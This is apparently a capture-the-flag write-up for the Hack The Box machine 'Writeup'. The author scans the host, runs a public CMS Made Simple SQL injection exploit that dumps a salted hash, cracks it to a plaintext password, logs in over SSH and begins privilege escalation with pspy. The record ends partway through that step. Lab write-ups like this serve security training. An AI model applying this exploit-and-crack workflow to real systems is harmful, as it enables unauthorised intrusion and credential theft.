<center><h1>Writeup</h1></center>
<br>
<center><h3>Summary</h3></center>
<br>

<br><br>
First start with an Nmap scan
```
# Nmap 7.70 scan initiated Sat Jun  8 15:42:31 2019 as: nmap -sV -sC -T4 10.10.10.138
Nmap scan report for 10.10.10.138
Host is up (0.17s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/writeup/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun  8 15:43:20 2019 -- 1 IP address (1 host up) scanned in 49.10 seconds
```
Only a couple ports open. I can already see that port 80 has a directory <b>/writeup</b>. Navigating to the page we see a very basic website that does not give us much to work from.

<center><img src="/htb/writeup/web.png"></center>
<br>
If you take a look at the web page source code then you should see that the website is running <b> CMS Made Simple</b>.

<center><img src="/htb/writeup/cms.png"></center>
<br>
Using <b>Searchsploit</b> we can find a vulnerability that works for us. I chose this one because it was the most recent one.
```
CMS Made Simple < 2.2.10 - SQL Injection                                                                              | exploits/php/webapps/46635.py
```
I download the exploit from the exploit database *[here](https://www.exploit-db.com/exploits/46635)*. Then I execute the script and wait until it finishes. Eventually we see some credentials.
```
# python CSM_SQL_Injection.py -u http://10.10.10.138/writeup
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```
So now we have a password hash and a salt. We can crack this by using and online password cracker. I used *[this](https://www.md5online.org/md5-decrypt.html)* one. After removing the salt, we get a password of <b>raykayjay9</b> and user of <b>jkr</b>.

<center><img src="/htb/writeup/decrypt.png"></center>
</br>
Using those credentials we are able to ssh in as the user <b>jkr</b>
```
# ssh jkr@10.10.10.138
The authenticity of host '10.10.10.138 (10.10.10.138)' can't be established.
ECDSA key fingerprint is SHA256:TEw8ogmentaVUz08dLoHLKmD7USL1uIqidsdoX77oy0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.138' (ECDSA) to the list of known hosts.
jkr@10.10.10.138's password:
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jkr@writeup:~$
```
From here we can read the <b>user.txt</b> file.
```
jkr@writeup:~$ cat user.txt
d4e493fd4068afc***************
```
Now for the priv esc. First thing I did was some manual enumeration but I didnt find anything. Next I ran an Enum script but that also didnt reveal much. Lastly, I upload <b>pspy64</b> to the box to monitor the running processes. You can upload this through <b>scp</b> or anything similar. Running the program doesn't reveal much at first.
```
2019/09/25 22:26:52 CMD: UID=0    PID=2040   | /sbin/getty 38400 tty1
2019/09/25 22:26:52 CMD: UID=0    PID=20     |
2019/09/25 22:26:52 CMD: UID=0    PID=2      |
2019/09/25 22:26:52 CMD: UID=0    PID=1971   | /usr/sbin/sshd
2019/09/25 22:26:52 CMD: UID=0    PID=1920   | logger -t mysqld -p daemon error
2019/09/25 22:26:52 CMD: UID=103  PID=1919   | /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb18/plugin --user=mysql --skip-log-error --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
2019/09/25 22:26:52 CMD: UID=0    PID=19     |
2019/09/25 22:26:52 CMD: UID=0    PID=18     |
2019/09/25 22:26:52 CMD: UID=0    PID=1798   | /usr/bin/python3 /usr/bin/fail2ban-server -s /var/run/fail2ban/fail2ban.sock -p /var/run/fail2ban/fail2ban.pid -b
2019/09/25 22:26:52 CMD: UID=0    PID=1749   | /bin/bash /usr/bin/mysqld_safe
2019/09/25 22:26:52 CMD: UID=0    PID=17     |
2019/09/25 22:26:52 CMD: UID=0    PID=1679   | /usr/sbin/elogind -D
2019/09/25 22:26:52 CMD: UID=101  PID=1631   | /usr/bin/dbus-daemon --system
2019/09/25 22:26:52 CMD: UID=0    PID=1628   | /usr/sbin/cron
2019/09/25 22:26:52 CMD: UID=0    PID=162    |
2019/09/25 22:26:52 CMD: UID=0    PID=161    |
2019/09/25 22:26:52 CMD: UID=0    PID=16     |
2019/09/25 22:26:52 CMD: UID=33   PID=1571   | /usr/sbin/apache2 -k start
2019/09/25 22:26:52 CMD: UID=33   PID=1570   | /usr/sbin/apache2 -k start
2019/09/25 22:26:52 CMD: UID=33   PID=1569   | /usr/sbin/apache2 -k start
2019/09/25 22:26:52 CMD: UID=33   PID=1568   | /usr/sbin/apache2 -k start
2019/09/25 22:26:52 CMD: UID=33   PID=1567   | /usr/sbin/apache2 -k start
2019/09/25 22:26:52 CMD: UID=0    PID=1564   | /usr/sbin/apache2 -k start
2019/09/25 22:26:52 CMD: UID=0    PID=155    |
2019/09/25 22:26:52 CMD: UID=0    PID=15     |
2019/09/25 22:26:52 CMD: UID=0    PID=1480   | /usr/lib/vmware-vgauth/VGAuthService -s
2019/09/25 22:26:52 CMD: UID=0    PID=1445   | /usr/sbin/vmtoolsd
2019/09/25 22:26:52 CMD: UID=0    PID=14     |
2019/09/25 22:26:52 CMD: UID=0    PID=1305   | /usr/sbin/rsyslogd
2019/09/25 22:26:52 CMD: UID=0    PID=130    |
2019/09/25 22:26:52 CMD: UID=0    PID=13     |
2019/09/25 22:26:52 CMD: UID=0    PID=12     |
2019/09/25 22:26:52 CMD: UID=0    PID=113    |
2019/09/25 22:26:52 CMD: UID=0    PID=112    |
2019/09/25 22:26:52 CMD: UID=0    PID=111    |
2019/09/25 22:26:52 CMD: UID=0    PID=110    |
2019/09/25 22:26:52 CMD: UID=0    PID=11     |
2019/09/25 22:26:52 CMD: UID=0    PID=10     |
2019/09/25 22:26:52 CMD: UID=0    PID=1      | init [2]   
2019/09/25 22:27:01 CMD: UID=0    PID=3155   | /usr/sbin/CRON
2019/09/25 22:27:01 CMD: UID=0    PID=3156   | /usr/sbin/CRON
2019/09/25 22:27:01 CMD: UID=0    PID=3157   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1
2019/09/25 22:27:02 CMD: UID=0    PID=3158   |
2019/09/25 22:28:01 CMD: UID=0    PID=3159   | /usr/sbin/CRON
2019/09/25 22:28:01 CMD: UID=0    PID=3160   | /usr/sbin/CRON
2019/09/25 22:28:01 CMD: UID=0    PID=3161   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1
```
This stumped me for a while since I was unable to find anything during the enumeration and there was very few running processes. The only idea I had left was to open another terminal and ssh in again to see what would happen if I generated my own traffic to the box. Luckily after doing that I get what I was looking for.
```
2019/09/25 22:31:59 CMD: UID=0    PID=3174   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
```
